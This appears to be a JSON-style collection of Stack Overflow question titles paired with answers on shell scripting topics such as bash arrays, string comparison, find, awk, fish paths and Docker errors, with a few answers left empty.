    "Rename files recursively Mac OSX": "This has been asked: Recursive batch rename\nWith your example, you could go with:\nbrew install rename\nfind . -exec rename 's|foo|bar|' {} +",
    "What does #$ do in bash? (aka: Hash dollar sign, pound dollar sign)": "#$ does \"nothing\", as # is starting comment and everything behind it on the same line is ignored (with the notable exception of the \"shebang\").\n$# is a variable containing the number of arguments passed to a shell script (like $* is a variable containing all arguments).",
    "How to echo directories containing matching file with Bash?": "find . -name '*.class' -printf '%h\\n' | sort -u\nFrom man find:\n-printf format\n%h Leading directories of file\u2019s name (all but the last element). If the file name contains no slashes (since it is in the current directory) the %h specifier expands to \".\".",
    "Remove entry from array": "Gilles second answer is correct if you wish to remove all occurences, but it is a full reassignment of the array and does not address the situation where you wish to remove only a single entry, regardless of duplicates. There is a way in zsh to remove an element from an normal array without reassigning the entire array:\nGiven the following array:\narray=(abc def ghi)\nthe following will return the index of the first match for def:\n${array[(i)def]}\nand the following format can be used to remove any given indexed value (element index 2 in this example) in an array without reassignment of the entire array:\narray[2]=()\nthus, to remove the value def we combine the two:\narray[$array[(i)def]]=()\nThis is cleaner for single element removal, since there is no explicit array reassignment (cleaner in that any potential side effects, such as the accidental removal of empty items, quoted format issues, etc. are not going to crop up). However Gilles' solution is largely equivalent and has the advantage of multiple matching item removal, if that is what you want. With his method and this method, you have a full toolset for standard array element removal.",
    "How do I replace single quotes with another character in sed?": "Try to keep sed commands simple as much as possible. Otherwise you'll get confused of what you'd written reading it later.\n#!/bin/bash\nsed \"s/'/ /g\" myfile.txt",
    "While-loop subshell dilemma in Bash": "The problem is that the while loop is part of a pipeline. In a bash pipeline, every element of the pipeline is executed in its own subshell [ref]. So after the while loop terminates, the while loop subshell's copy of var is discarded, and the original var of the parent (whose value is unchanged) is echoed.\nOne way to fix this is by using Process Substitution as shown below:\nvar=0\nwhile read i;\ndo\n  # perform computations on $i\n  ((var++))\ndone < <(find . -type f -name \"*.bin\" -maxdepth 1)\nTake a look at BashFAQ/024 for other workarounds.\nNotice that I have also replaced ls with find because it is not good practice to parse ls.",
    "Easiest way to check for file extension in bash? [duplicate]": "You can do this with a simple regex, using the =~ operator inside a [[...]] test:\nif [[ $file =~ \\.gz$ ]];\nThis won't give you the right answer if the extension is .tgz, if you care about that. But it's easy to fix:\nif [[ $file =~ \\.t?gz$ ]];\nThe absence of quotes around the regex is necessary and important. You could quote $file but there is no point.\nIt would probably be better to use the file utility:\n$ file --mime-type something.gz\nsomething.gz: application/x-gzip\nSomething like:\nif file --mime-type \"$file\" | grep -q gzip$; then\n  echo \"$file is gzipped\"\nelse\n  echo \"$file is not gzipped\"\nfi",
    "ZSH for loop array variable issue": "It's actually much simpler than that:\nlw=('plugin1' 'plugin2' 'plugin3')\n\nfor i in $lw; do\n  . ~/Library/Rogall/plugins/$i/lw.prg end\ndone\nIn summary:\nAssign to foo, not $foo (the shell would try to expand $foo and assign to whatever it expands to; typically not useful)\nUse the loop variable directly; it contains the array value rather than the index",
    "How do I make multiple folders in a single location using relative path to the location?": "In Bash and other shells that support it, you can do\nmkdir ~/Labs/lab4a/folder{1..3}\nor\nmkdir ~/Labs/lab4a/folder{1,2,3}\nOther options:\nmkdir $(seq -f \"$HOME/Labs/lab4a/folder%03g\" 3)\n\nmkdir $(printf \"$HOME/Labs/lab4a/folder%03g \" {0..3})\nWhich will give you leading zeros which make sorting easier.\nThis will do the same thing in Bash 4:\nmkdir ~/Labs/lab4a/folder{001..3}",
    "Add a relative path to $PATH on fish startup": "The best way I have found to persistently add a path to your $PATH is\nset -U fish_user_paths $fish_user_paths ~/path/name\nThis prepends to $PATH. And since it's persistent, the path stays in $PATH on shell restarts.\nIt's more efficient than putting a command in your config.fish to modify your $PATH, because it only runs once compared to running on every shell restart.\nThe variable fish_user_paths is intended to be set by the user1, as stated by ridiculousfish, the maintainer of fish.\nConsider creating a fish function for convenience: 2\n# ~/.config/fish/functions/add_to_path.fish\nfunction add_to_path --description 'Persistently prepends paths to your PATH'\n  set --universal fish_user_paths $fish_user_paths $argv\nend\nAnd use it as:\n$ add_to_path foo bar  # Adds foo/ and bar/ to your PATH\nNotes\nOn that page the author gives the example set -U fish_user_paths ~/bin. This overwrites fish_user_paths with a single value of ~/bin. To avoid losing existing paths set in fish_user_paths, be sure to include $fish_user_paths in addition to any new paths being added (as seen in my answer).\nMy dotfiles contain a slightly more advanced version that skips adding duplicates https://github.com/dideler/dotfiles/blob/master/.config/fish/functions/add_to_user_path.fish",
    "How to append several lines of text in a file using a shell script": "You can use a here document:\ncat <<EOF >> outputfile\nsome lines\nof text\nEOF",
    "Get users home directory when they run a script as root": "Try to avoid eval. Especially with root perms.\nYou can do:\nUSER_HOME=$(getent passwd $SUDO_USER | cut -d: -f6)\nUpdate:\nhere is why to avoid eval.",
    "How can I use iterm as default terminal on macOS?": "(Open iTerm Build version 3.3.7)\nMenu: iTerm2 > Make iTerm2 Default Term",
    "How to get the Bash version number": "There's also a special array (BASH_VERSINFO) containing each version number in separate elements.\nif ((BASH_VERSINFO[0] < 3))\nthen\n  echo \"Sorry, you need at least bash-3.0 to run this script.\"\n  exit 1\nfi\nSee 9.1. Internal Variables for more information:\n# Bash version information:\n\nfor n in 0 1 2 3 4 5\ndo\n  echo \"BASH_VERSINFO[$n] = ${BASH_VERSINFO[$n]}\"\ndone\n\n# BASH_VERSINFO[0] = 3                      # Major version no.\n# BASH_VERSINFO[1] = 00                     # Minor version no.\n# BASH_VERSINFO[2] = 14                     # Patch level.\n# BASH_VERSINFO[3] = 1                      # Build version.\n# BASH_VERSINFO[4] = release                # Release status.\n# BASH_VERSINFO[5] = i386-redhat-linux-gnu  # Architecture\n                                            # (same as $MACHTYPE).",
    "How to exit a shell script if targeted file doesn't exist?": "You can check for file existence with something like:\nif [[ -f x.txt ]] ; then\n    echo file exists.\nfi\nTo exit if it doesn't, something like this would suffice:\nif [[ ! -f x.txt ]] ; then\n    echo 'File \"x.txt\" is not there, aborting.'\n    exit\nfi\nThe -f <file> is only one of the many conditional expressions you can use. If you look at the bash man-page under CONDITIONAL EXPRESSIONS, you'll see a whole host of them.\nIf (as stated in a question update) you wish to check if a wildcard results in files, you can simply expand it, throwing away the errors. If there are none, you'll end up with an empty string which can be detected with -z:\nif [[ -z \"$(ls -1 */*.txt 2>/dev/null | grep ab1)\" ]] ; then\n    echo 'There are no \"*/*.txt\" files.'\n    exit\nfi\nNote that I've used -1 to force one file per line even though Linux ls does that by default if the output device is not a terminal (from memory). That's just in case you try this on a machine that doesn't force one per line in that case.\nKeep in mind however that, if you have spaces in your filenames, using ls and then awk to extract column 1 is not going to work too well. For example, the file abc ab1.txt will result in the extraction of only the abc bit.\nUsing find with -print0, combined with xargs with -0 is the usual way to properly process files which may have \"special\" characters in them. There are many other options you can give to find to ensure only the files required are processed, such as -maxdepth to limit how far down the directory tree you go, and -name to properly filter file names.\nHowever, if you know that you will never have these types of files, it's probably okay to use the ls solution, just make sure you're comfortable with its shortcomings.",
    "Shell scripting: die on any error": "With standard sh and bash, you can\nset -e\nIt will\n$ help set\n...\n        -e  Exit immediately if a command exits with a non-zero status.\nIt also works (from what I could gather) with zsh. It also should work for any Bourne shell descendant.\nWith csh/tcsh, you have to launch your script with #!/bin/csh -e",
    "bash script to check if the current git branch = \"x\"": "Use git rev-parse --abbrev-ref HEAD to get the name of the current branch.\nThen it's only a matter of simply comparing values in your script:\nBRANCH=\"$(git rev-parse --abbrev-ref HEAD)\"\nif [[ \"$BRANCH\" != \"x\" ]]; then\n  echo 'Aborting script';\n  exit 1;\nfi\n\necho 'Do stuff';",
    "Is it possible to recursively create folders using a shell script?": "You should pass the -p parameter to mkdir so it will create all the subfolders. So following your example:\nmkdir -p folder1/folder2/folder3",
    "Cannot run adb shell \"date `date +%m%d%H%M%Y.%S`\"": "Inside the emulator goto Settings > Date & Time\nDeselect Automatic timezone.\nAdjust your timezone manually.\nDeselect automatic date & time and set correct time",
    "Check return status of psql command in unix shell scripting": "psql return code is documented as:\nEXIT STATUS\npsql returns 0 to the shell if it finished normally, 1 if a fatal error of its own occurs (e.g. out of memory, file not found), 2 if the connection to the server went bad and the session was not interactive, and 3 if an error occurred in a script and the variable ON_ERROR_STOP was set.\nYou probably just want to use ON_ERROR_STOP.\nFailure getting tested and reported to the shell:\n$ psql -d test -v \"ON_ERROR_STOP=1\" <<EOF\nselect error;\nselect 'OK';\nEOF\n\nERROR:  column \"error\" does not exist\nLINE 1: select error;\n\n$ echo $?\n3\nFailure getting ignored and not reported to the shell:\n$ psql -d test  <<EOF\nselect error;\nselect 'OK';\nEOF\nERROR:  column \"error\" does not exist\nLINE 1: select error;\n               ^\n ?column? \n----------\n OK\n(1 row)\n\n$ echo $?\n0",
    "How to cut first column (variable length) of a string in shell": "Many ways:\ncut -d' ' -f1 <filename # If field separator is space\ncut -f1 <filename  # If field separator is tab\ncut -d' ' -f1 <filename | cut -f1  # If field separator is space OR tab\nawk '{print $1}' filename\nwhile read x _ ; do echo $x ; done < filename",
    "Wait for Shell to finish, then format cells - synchronously execute a command": "Try the WshShell object instead of the native Shell function.\nDim wsh As Object\nSet wsh = VBA.CreateObject(\"WScript.Shell\")\nDim waitOnReturn As Boolean: waitOnReturn = True\nDim windowStyle As Integer: windowStyle = 1\nDim errorCode As Long\n\nerrorCode = wsh.Run(\"notepad.exe\", windowStyle, waitOnReturn)\n\nIf errorCode = 0 Then\n    MsgBox \"Done! No error to report.\"\nElse\n    MsgBox \"Program exited with error code \" & errorCode & \".\"\nEnd If    \nThough note that:\nIf bWaitOnReturn is set to false (the default), the Run method returns immediately after starting the program, automatically returning 0 (not to be interpreted as an error code).\nSo to detect whether the program executed successfully, you need waitOnReturn to be set to True as in my example above. Otherwise it will just return zero no matter what.\nFor early binding (gives access to Autocompletion), set a reference to \"Windows Script Host Object Model\" (Tools > Reference > set checkmark) and declare like this:\nDim wsh As WshShell \nSet wsh = New WshShell\nNow to run your process instead of Notepad... I expect your system will balk at paths containing space characters (...\\My Documents\\..., ...\\Program Files\\..., etc.), so you should enclose the path in \"quotes\":\nDim pth as String\npth = \"\"\"\" & ThisWorkbook.Path & \"\\ProcessData.exe\" & \"\"\"\"\nerrorCode = wsh.Run(pth , windowStyle, waitOnReturn)",
    "Get current directory and concatenate a path": "Sounds like you want:\npath=\"$(pwd)/some/path\"\nThe $( opens a subshell (and the ) closes it) where the contents are executed as a script so any outputs are put in that location in the string.\nMore useful often is getting the directory of the script that is running:\ndot=\"$(cd \"$(dirname \"$0\")\"; pwd)\"\npath=\"$dot/some/path\"\nThat's more useful because it resolves to the same path no matter where you are when you run the script:\n> pwd\n~\n> ./my_project/my_script.sh\n~/my_project/some/path\nrather than:\n> pwd\n~\n> ./my_project/my_script.sh\n~/some/path\n> cd my_project\n> pwd\n~/my_project\n> ./my_script.sh\n~/my_project/some/path\nMore complex but if you need the directory of the current script running if it has been executed through a symlink (common when installing scripts through homebrew for example) then you need to parse and follow the symlink:\nif [[ \"$OSTYPE\" == *darwin* ]]; then\n  READLINK_CMD='greadlink'\nelse\n  READLINK_CMD='readlink'\nfi\n\ndot=\"$(cd \"$(dirname \"$([ -L \"$0\" ] && $READLINK_CMD -f \"$0\" || echo \"$0\")\")\"; pwd)\"\nMore complex and more requirements for it to work (e.g. having a gnu compatible readlink installed) so I tend not to use it as much. Only when I'm certain I need it, like installing a command through homebrew.",
    "Python module to shellquote/unshellquote? [duplicate]": "Looks like\ntry:  # py3\n    from shlex import quote\nexcept ImportError:  # py2\n    from pipes import quote\n\nquote(\"hello stack overflow's quite cool\")\n>>> '\"hello stack overflow\\'s quite cool\"'\ngets me far enough.",
    "Check if a program exists from a Fish script": "There is type -q, as in\nif type -q $program\n     # do stuff\nend\nwhich returns 0 if something is a function, builtin or external program (i.e. if it is something fish will execute).\nThere is also\ncommand -q, which will return 0 only if it exists as an external program\nbuiltin -q, which will return 0 only if it is a fish builtin\nfunctions -q, which will return 0 only if it is a fish function\nFor all of these the \"-q\" flag silences all output and just queries for existence.\nIf e.g. builtin -q returns true, that just means it is also a builtin - it can still be a function or command as well.\ncommand -q works since fish 3.1.0 because the -q flag implies -s, before it would have to be command -sq.",
    "bash script, create array of all files in a directory": "You can do:\n# use nullglob in case there are no matching files\nshopt -s nullglob\n\n# create an array with all the filer/dir inside ~/myDir\narr=(~/myDir/*)\n\n# iterate through array using a counter\nfor ((i=0; i<${#arr[@]}; i++)); do\n    #do something to each element of array\n    echo \"${arr[$i]}\"\ndone\nYou can also do this for iteration of array:\nfor f in \"${arr[@]}\"; do\n   echo \"$f\"\ndone",
    "Kill a Docker Container": "You will be able to see currently running docker containers using below command.\ndocker ps\nThen copy the CONTAINER ID of the running container and execute the following command\ndocker stop <container_id>\nPlease replace with a real value.",
    "mkdir -p fails when directory exists": "This could be caused if there is already a file by the same name located in the directory.\nNote that a directory cannot contain both a file and folder by the same name on linux machines.",
    "Where to find info on Android's \"service call\" shell command?": "",
    "Bash: echo string that starts with \"-\"": "The answers that say to put $VAR in quotes are only correct by side effect. That is, when put in quotes, echo(1) receives a single argument of -e xyz, and since that is not a valid option string, echo just prints it out. It is a side effect as echo could just as easily print an error regarding malformed options. Most programs will do this, but it seems GNU echo (from coreutils) and the version built into bash simply echo strings that start with a hyphen but are not valid argument strings. This behaviour is not documented so it should not be relied upon.\nFurther, if $VAR contains a valid echo option argument, then quoting $VAR will not help:\n$ VAR=\"-e\"\n$ echo \"$VAR\"\n\n$\nMost GNU programs take -- as an argument to mean no more option processing \u2014 all the arguments after -- are to be processed as non-option arguments. bash echo does not support this so you cannot use it. Even if it did, it would not be portable. echo has other portability issues (-n vs \\c, no -e).\nThe correct and portable solution is to use printf(1).\nprintf \"%s\\n\" \"$VAR\"",
    "Use shebang/hashbang in Windows Command Prompt": "Yes, this is possible using the PATHEXT environment variable. Which is e.g. also used to register .vbs or .wsh scripts to be run \"directly\".\nFirst you need to extend the PATHEXT variable to contain the extension of that serve script (in the following I assume that extension is .foo as I don't know Node.js)\nThe default values are something like this:\nPATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC\nYou need to change it (through the Control Panel) to look like this:\nPATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.FOO\nUsing the control panel (Control Panel -> System -> Advanced System Settings -> Environment Variables is necessary to persist the value of the PATHEXT variable.\nThen you need to register the correct \"interpreter\" with that extension using the commands FTYPE and ASSOC:\nASSOC .foo=FooScript\nFTYPE FooScript=foorunner.exe %1 %*\n(The above example is shamelessly taken from the help provided by ftype /?.)\nASSOC and FTYPE will write directly into the registry, so you will need an administrative account to run them.",
    "Terminal: Where is the shell start-up file?": "You're probably using bash so just add these 3 lines to ~/.bash_profile:\n$ cat >> ~/.bash_profile\nexport WORKON_HOME=$HOME/.virtualenvs\nexport PROJECT_HOME=$HOME/directory-you-do-development-in\nsource /usr/local/bin/virtualenvwrapper.sh\n^D\nwhere ^D means you type Control+D (EOF).\nThen either close your terminal window and open a new one, or you can \"reload\" your .bash_profile like this:\n$ source ~/.bash_profile",
    "Run a shell script in new terminal from current terminal": "Here's a simple example to get you started:\nTo write a shell script, do this on your command prompt:\necho -e '#!/bin/sh\\n echo \"hello world\"' > abc.sh\nThis writes:\n#!/bin/sh\necho \"hello world\"\nTo a file called abc.sh\nNext, you want to set it to executable by:\nchmod +x abc.sh\nNow, you can run it by:\n./abc.sh\nAnd you should see:\nhello world\nOn your terminal.\nTo run it in a new terminal, you can do:\ngnome-terminal -x ./abc.sh\nor, if it's xterm:\nxterm -e ./abc.sh\nHere's a list of different terminal emulators.\nAlternatively, you just run it in your current terminal, but background it instead by:\n./abc.sh &",
    "Starting container process caused \"exec: \\\"/bin/sh\\\": stat /bin/sh: no such file or directory\": unknown": "There are two things happening here.\nA Dockerfile that starts FROM scratch starts from a base image that has absolutely nothing at all in it. It is totally empty. There is not a set of base tools or libraries or anything else, beyond a couple of device files Docker pushes in for you.\nThe ENTRYPOINT echo ... command gets rewritten by Docker into ENTRYPOINT [\"/bin/sh\", \"-c\", \"echo ...\"], and causes the CMD to be totally ignored. Unless overridden with docker run --entrypoint, this becomes the main process the container runs.\nSince it is a FROM scratch image and contains absolutely nothing at all, it doesn't contain a shell, hence the \"/bin/sh: no such file or directory\" error.",
    "Apple File System (APFS) Check if file is a clone on Terminal (shell)": "After 3 years and 2 months... I received a lot of points because of this question here on stackoverflow.\nSo yesterday I decided to revisit this topic :).\nUsing fcntl and F_LOG2PHYS is possible to check if files are using same physical blocks or not.\nSo I made an utility using this idea and put it on github (https://github.com/dyorgio/apfs-clone-checker).\nIt is only the first release guys, but I hope that the community can improve it.\nNow maybe a good tool to remove duplicated files using clone APFS feature can be born. >:)",
    "How can I gzip standard in to a file and also print standard in to standard out?": "Another way (assuming a shell like bash or zsh):\necho \"hey hey, we're the monkees\" | tee >(gzip --stdout > my_log.gz)\nThe admittedly strange >() syntax basically does the following:\nCreate new FIFO (usually something in /tmp/)\nExecute command inside () and bind the FIFO to stdin on that subcommand\nReturn FIFO filename to command line.\nWhat tee ends up seeing, then, is something like:\ntee /tmp/arjhaiX4\nAll gzip sees is its standard input.\nFor Bash, see man bash for details. It's in the section on redirection. For Zsh, see man zshexpn under the heading \"Process Substitution.\"\nAs far as I can tell, the Korn Shell, variants of the classic Bourne Shell (including ash and dash), and the C Shell don't support this syntax.",
    "Comparing PHP version numbers using Bash?": "Here's how to compare versions.\nusing sort -V:\nfunction version_gt() { test \"$(printf '%s\\n' \"$@\" | sort -V | head -n 1)\" != \"$1\"; }\nexample usage:\nfirst_version=5.100.2\nsecond_version=5.1.2\nif version_gt $first_version $second_version; then\n     echo \"$first_version is greater than $second_version !\"\nfi\npro:\nsolid way to compare fancy version strings:\nsupport any length of sub-parts (ie: 1.3alpha.2.dev2 > 1.1 ?)\nsupport alpha-betical sort (ie: 1.alpha < 1.beta2)\nsupport big size version (ie: 1.10003939209329320932 > 1.2039209378273789273 ?)\ncan easily be modified to support n arguments. (leaved as an exercise ;) )\nusually very usefull with 3 arguments: (ie: 1.2 < my_version < 2.7 )\ncons:\nuses a lot of various calls to different programs. So it's not that efficient.\nuses a pretty recent version of sort and it might not be available on your system. (check with man sort)\nwithout sort -V:\n## each separate version number must be less than 3 digit wide !\nfunction version { echo \"$@\" | gawk -F. '{ printf(\"%03d%03d%03d\\n\", $1,$2,$3); }'; }\nexample usage:\nfirst_version=5.100.2\nsecond_version=5.1.2\nif [ \"$(version \"$first_version\")\" -gt \"$(version \"$second_version\")\" ]; then\n     echo \"$first_version is greater than $second_version !\"\nfi\npro:\nquicker solution as it only calls 1 subprocess\nmuch more compatible solution.\ncons:\nquite specific, version string must:\nhave version with 1, 2 or 3 parts only. (excludes '2.1.3.1')\neach parts must be numerical only (excludes '3.1a')\neach part can't be greater than 999 (excludes '1.20140417')\nComments about your script:\nI can't see how it could work:\nas stated in a comment > and < are very special shell character and you should replace them by -gt and -lt\neven if you replaced the characters, you can't compare version numbers as if they where integers or float. For instance, on my system, php version is 5.5.9-1ubuntu4.\nBut your function version() is quite cleverly written already and may help you by circumventing the classical issue that sorting alphabetically numbers won't sort numbers numerically ( alphabetically 1 < 11 < 2, which is wrong numerically). But be carefull: arbitrarily large numbers aren't supported by bash (try to keep under 32bits if you aim at compatibility with 32bits systems, so that would be 9 digit long numbers). So I've modified your code (in the second method NOT using sort -V) to force only 3 digits for each part of the version string.\nEDIT: applied @phk amelioration, as it is noticeably cleverer and remove a subprocess call in the first version using sort. Thanks.",
    "Anonymous functions in shell scripts": "Short answer: No.\nLong answer: Nooooooooooooo.\nComplete answer: Functions in bash are not first-class objects, therefore there can be no such thing as an anonymous function in bash.",
    "Run a command shell in jenkins": "",
    "unary operator expected in shell script when comparing null value with string": "Since the value of $var is the empty string, this:\nif [ $var == $var1 ]; then\nexpands to this:\nif [ == abcd ]; then\nwhich is a syntax error.\nYou need to quote the arguments:\nif [ \"$var\" == \"$var1\" ]; then\nYou can also use = rather than ==; that's the original syntax, and it's a bit more portable.\nIf you're using bash, you can use the [[ syntax, which doesn't require the quotes:\nif [[ $var = $var1 ]]; then\nEven then, it doesn't hurt to quote the variable reference, and adding quotes:\nif [[ \"$var\" = \"$var1\" ]]; then\nmight save a future reader a moment trying to remember whether [[ ... ]] requires them.",
    "Display only files and folders that are symbolic links in tcsh or bash": "Find all the symbolic links in a directory:\nls -l `find /usr/bin -maxdepth 1 -type l -print`\nFor the listing of hidden files:\nls -ald .*",
    "How do you install lxml on OS X Leopard without using MacPorts or Fink?": "Thanks to @jessenoller on Twitter I have an answer that fits my needs - you can compile lxml with static dependencies, hence avoiding messing with the libxml2 that ships with OS X. Here's what worked for me:\ncd /tmp\ncurl -O http://lxml.de/files/lxml-3.6.0.tgz\ntar -xzvf lxml-3.6.0.tgz \ncd lxml-3.6.0\npython setup.py build --static-deps --libxml2-version=2.7.3  --libxslt-version=1.1.24 \nsudo python setup.py install",
    "How to skip the first argument in $@?": "Use the offset parameter expansion\n#!/bin/bash\n\nfor i in \"${@:2}\"; do\n    echo $i\ndone\nExample\n$ func(){ for i in \"${@:2}\"; do echo \"$i\"; done;}; func one two three\ntwo\nthree",
    "Run all shell scripts in folder": "Use this:\nfor f in *.sh; do\n  bash \"$f\" \ndone\nIf you want to stop the whole execution when a script fails:\nfor f in *.sh; do\n  bash \"$f\" || break  # execute successfully or break\n  # Or more explicitly: if this execution fails, then stop the `for`:\n  # if ! bash \"$f\"; then break; fi\ndone\nAnd to preserve the exit code of the failed script:\n#!/bin/bash\nset -e  # exit on error\nfor f in *.sh; do\n  bash \"$f\"\ndone",
    "How to test if a given path is a mount point": "I discover that on my Fedora 7 there is a mountpoint command.\nFrom man mountpoint:\nNAME\n       mountpoint - see if a directory is a mountpoint\n\nSYNOPSIS\n       /bin/mountpoint [-q] [-d] /path/to/directory\n       /bin/mountpoint -x /dev/device\nApparently it come with the sysvinit package, I don't know if this command is available on other systems.\n[root@myhost~]# rpm -qf $(which mountpoint)\nsysvinit-2.86-17",
    "Variables as commands in Bash scripts": "Simply don't put whole commands in variables. You'll get into a lot of trouble trying to recover quoted arguments.\nAlso:\nAvoid using all-capitals variable names in scripts. It is an easy way to shoot yourself in the foot.\nDon't use backquotes. Use $(...) instead; it nests better.\n#! /bin/bash\n\nif [ $# -ne 2 ]\nthen\n    echo \"Usage: $(basename $0) DIRECTORY BACKUP_DIRECTORY\"\n    exit 1\nfi\n\ndirectory=$1\nbackup_directory=$2\ncurrent_date=$(date +%Y-%m-%dT%H-%M-%S)\nbackup_file=\"${backup_directory}/${current_date}.backup\"\n\ntar cv \"$directory\" | openssl des3 -salt | split -b 1024m - \"$backup_file\"",
    "idioms for returning multiple values in shell scripting": "In the special case where your values never contain spaces, this read trick can be a simple solution:\nget_vars () {\n  #...\n  echo \"value1\" \"value2\"\n}\n\nread var1 var2 < <(get_vars)\necho \"var1='$var1', var2='$var2'\"\nBut of course, it breaks as soon as there is a space in one of the values. You could modify IFS and use a special separator in your function's echo, but then the result is not really simpler than the other suggested solutions.",
    "Raise to the power in shell": "I would try the calculator bc. See http://www.basicallytech.com/blog/index.php?/archives/23-command-line-calculations-using-bc.html for more details and examples.\neg.\n$ echo '6^6' | bc\nGives 6 to the power 6.",
    "Capture the output of Perl's 'system()'": "That's what backticks are for. From perldoc perlfaq8:\nWhy can't I get the output of a command with system()?\nYou're confusing the purpose of system() and backticks (``). system() runs a command and returns exit status information (as a 16 bit value: the low 7 bits are the signal the process died from, if any, and the high 8 bits are the actual exit value). Backticks (``) run a command and return what it sent to STDOUT.\nmy $exit_status   = system(\"mail-users\");\nmy $output_string = `ls`;\nSee perldoc perlop for more details.",
    "Number of fields returned by awk": "The NF variable is set to the total number of fields in the input record. So:\necho \"a b c d\" | awk --field-separator=\" \" \"{ print NF }\"\nwill display\n4\nNote, however, that:\necho -e \"a b c d\\na b\" | awk --field-separator=\" \" \"{ print NF }\"\nwill display:\n4\n2\nHope this helps, and happy awking",
    "Linux Shell Script - String Comparison with wildcards": "When using == or != in bash you can write:\nif [[ $t1 == *\"$t2\"* ]]; then\n    echo \"$t1 and $t2 are equal\"\nfi\nNote that the asterisks go on the outside of the quotes and that the wildcard pattern must be on the right.\nFor /bin/sh, the = operator is for equality only, not pattern matching. You can use case for pattern matching though:\ncase \"$t1\" in\n    *\"$t2\"*) echo t1 contains t2 ;;\n    *) echo t1 does not contain t2 ;;\nesac\nIf you're specifically targeting Linux, I would assume the presence of /bin/bash.",
    "pip is not uninstalling packages": "You can always manually delete the packages; you can run:\nsudo rm -rf /usr/local/lib/python2.7/dist-packages/twitter\nto remove that package from your dist-packages directory. You may have to edit the easy-install.pth file in the same directory and remove the twitter entry from it.",
    "Bash: How to set a variable from argument, and with a default value": "I see several questions here.\n\u201cCan I write something that actually reflects this logic\u201d\nYes. There are a few ways you can do it. Here's one:\nif [[ \"$1\" != \"\" ]]; then\n    DIR=\"$1\"\nelse\n    DIR=.\nfi\n\u201cWhat is the difference between this and DIR=${1-.}?\u201d\nThe syntax ${1-.} expands to . if $1 is unset, but expands like $1 if $1 is set\u2014even if $1 is set to the empty string.\nThe syntax ${1:-.} expands to . if $1 is unset or is set to the empty string. It expands like $1 only if $1 is set to something other than the empty string.\n\u201cWhy can't I do this? DIR=\"$1\" || '.'\u201d\nBecause this is bash, not perl or ruby or some other language. (Pardon my snideness.)\nIn bash, || separates entire commands (technically it separates pipelines). It doesn't separate expressions.\nSo DIR=\"$1\" || '.' means \u201cexecute DIR=\"$1\", and if that exits with a non-zero exit code, execute '.'\u201d.",
    "Appending a line break to an output file in a shell script": "I'm betting the problem is that Cygwin is writing Unix line endings (LF) to the file, and you're opening it with a program that expects Windows line-endings (CRLF). To determine if this is the case \u2014 and for a bit of a hackish workaround \u2014 try:\necho \"`date` User `whoami` started the script.\"$'\\r' >> output.log\n(where the $'\\r' at the end is an extra carriage-return; it, plus the Unix line ending, will result in a Windows line ending).",
    "How do you determine what bash ls colours mean?": "The colors are defined by the $LS_COLORS environment variable. Depending on your distro, it is generated automatically when the shell starts, using ~/.dircolors or /etc/DIR_COLORS.\nEdit:\nTo list color meanings, use this script:\neval $(echo \"no:global default;fi:normal file;di:directory;ln:symbolic link;pi:named pipe;so:socket;do:door;bd:block device;cd:character device;or:orphan symlink;mi:missing file;su:set uid;sg:set gid;tw:sticky other writable;ow:other writable;st:sticky;ex:executable;\"|sed -e 's/:/=\"/g; s/\\;/\"\\n/g')\n{\n  IFS=:\n  for i in $LS_COLORS\n  do\n    echo -e \"\\e[${i#*=}m$( x=${i%=*}; [ \"${!x}\" ] && echo \"${!x}\" || echo \"$x\" )\\e[m\"\n  done\n}",
    "What is the difference between an inline variable assignment and a regular one in Bash?": "The format VAR=value command sets the variable VAR to have the value value in the environment of the command command. The spec section covering this is the Simple Commands. Specifically:\nOtherwise, the variable assignments shall be exported for the execution environment of the command and shall not affect the current execution environment except as a side-effect of the expansions performed in step 4.\nThe format VAR=value; command sets the shell variable VAR in the current shell and then runs command as a child process. The child process doesn't know anything about the variables set in the shell process.\nThe mechanism by which a process exports (hint hint) a variable to be seen by child processes is by setting them in its environment before running the child process. The shell built-in which does this is export. This is why you often see export VAR=value and VAR=value; export VAR.\nThe syntax you are discussing is a short-form for something akin to:\nVAR=value\nexport VAR\ncommand\nunset -v VAR\nonly without using the current process environment at all.",
    "how to extract a substring in bash": "Do use the expression\n{string:position:length}\nSo in this case:\n$ str=\"abcdefghijklm\"\n$ echo \"${str:0:5}\"\nabcde\nSee other usages:\n$ echo \"${str:0}\"      # default: start from the 0th position\nabcdefghijklm\n$ echo \"${str:1:5}\"    # start from the 1th and get 5 characters\nbcdef\n$ echo \"${str:10:1}\"   # start from 10th just one character\nk\n$ echo \"${str:5}\"      # start from 5th until the end\nfghijklm\nTaken from:\n- wooledge.org - How can I use parameter expansion? How can I get substrings? How can I get a file without its extension, or get just a file's extension?\n- Shell Command Language - 2.6.2 Parameter Expansion",
    "Batch file equivalent of CURRENTDIR=\"$PWD\"?": "The simplest form:\nSET CURRENTDIR=\"%cd%\"",
    "How do I echo directly on standard output inside a shell function?": "The $(...) calling syntax captures standard output. That is its job. That's what it does.\nIf you want static messages that don't get caught by that then you can use standard error (though don't do this for things that aren't error message or debugging messages, etc. please).\nYou can't have a function which outputs to standard output but that doesn't get caught by the $(...) context it is running in because there's only one standard output stream. The best you could do for that would be to detect when you have a controlling terminal/etc. and write directly to that instead (but I'd advise not doing that most of the time either).\nTo redirect to standard error for the function entirely you can do either of these.\nprint_message() {\n    echo \"message content\" >&2\n}\nor\nprint_message() {\n    echo \"message content\"\n} >&2\nThe difference is immaterial when there is only one line of output but if there are multiple lines of output then the latter is likely to be slightly more optimized (especially when the output stream happens to be a file).\nAlso avoid the function keyword as it isn't POSIX/spec and isn't as broadly portable.",
    "How to set multiple values with helm?": "According to https://github.com/kubernetes/helm/issues/1987#issuecomment-280497496, you set multiple values using curly braces, for example:\n--set foo={a,b,c}\nSo, in your case it would be like this\n--set aws.subnets={subnet-123456,subnet-654321}",
    "Execute command on remote server via ssh": "Your PATH is setup differently when your shell is interactive (= when you are logged in on the server), and when not interactive (running commands with ssh).\nLook into the rc files used by your shell, for example .bashrc, .bash_profile, .profile (depends on your system). If you set PATH at the right place, then ttisql can work when you run it via ssh.\nAnother solution is to use the absolute path of ttisql, then it will not depend on your PATH setup.",
